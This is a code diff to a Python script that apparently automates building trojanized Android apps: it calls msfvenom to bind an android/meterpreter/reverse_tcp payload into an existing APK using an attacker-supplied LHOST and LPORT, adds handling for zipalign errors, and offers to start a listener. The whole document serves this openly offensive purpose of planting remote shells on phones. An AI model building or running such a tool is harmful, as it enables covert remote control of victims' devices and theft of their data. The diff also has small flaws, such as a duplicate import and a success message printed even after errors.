@@ -6,6 +6,8 @@ import shutil
 import stat
 import subprocess
 import apt
+import subprocess
+import ZipalignReinstallTool
 
 init(autoreset=True)
 
@@ -131,12 +133,33 @@ def generate_payload():
     apkname = input(Fore.YELLOW + "Enter the App/apk name: ")
     print(Fore.CYAN + "Creating APK Please wait...")
     #Replace example.apk with the apk you want to bind the payload to.
-    os.system(f"msfvenom -x example.apk -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apkname}.apk")
-  
+    try:
+        cmd = f"msfvenom -x example.apk -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {apkname}.apk"
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
+
+        err = proc.stderr.read()
+        if err:
+            if "Unable to align apk with zipalign" in err:
+                print(Fore.RED + "Error: Unable to align apk with zipalign.")
+                choice = input(Fore.YELLOW + "Do you want to run the ZipalignReinstallTool to fix this? (Y/N): ")
+                if choice.upper() == 'Y':
+                    print(Fore.CYAN + "Running ZipalignReinstallTool to resolve the issue...")
+                    ZipalignReinstallTool.main()
+                    time.sleep(1)
+                    menu()
+                else:
+                    print(Fore.YELLOW + "Skipping ZipalignReinstallTool. Exiting...")
+                    time.sleep(2)
+                    exit(1)
+    except Exception as e:
+        print(Fore.RED + f"An unexpected error occurred: {e}")
+        time.sleep(2)
+        exit(1)
+
     clear_with_style()
     print(Fore.GREEN + f"APK payload generated successfully saved as {apkname}.apk")
-    listencho = input(Fore.YELLOW + "Would you like to listen?(Y/N): ")
-    if listencho == "Y":
+    listencho = input(Fore.YELLOW + "Would you like to listen? (Y/N): ")
+    if listencho.upper() == "Y":
         set_listener()
     else:
         menu()
